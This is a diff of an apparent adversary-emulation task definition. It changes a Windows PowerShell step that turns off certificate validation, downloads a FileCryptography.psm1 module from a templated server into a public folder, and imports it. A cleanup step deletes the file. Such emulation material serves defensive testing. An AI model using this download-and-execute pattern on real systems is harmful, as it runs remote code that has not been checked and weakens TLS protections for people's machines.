@@ -10,7 +10,12 @@
   executors:
     windows:
       command: |
-        Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1;
-        Import-Module ./FileCryptography.psm1 -Verbose -Force;
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};
+        $url="#{server}/file/download";
+        $wc=New-Object System.Net.WebClient;
+        $wc.Headers.add("file","FileCryptography.psm1");
+        $output="C:\Users\Public\FileCryptography.psm1";
+        $wc.DownloadFile($url,$output);
+        Import-Module C:\Users\Public\FileCryptography.psm1 -Verbose -Force;
       cleanup: |
-        Remove-Item FileCryptography.psm1
+        Remove-Item C:\Users\Public\FileCryptography.psm1
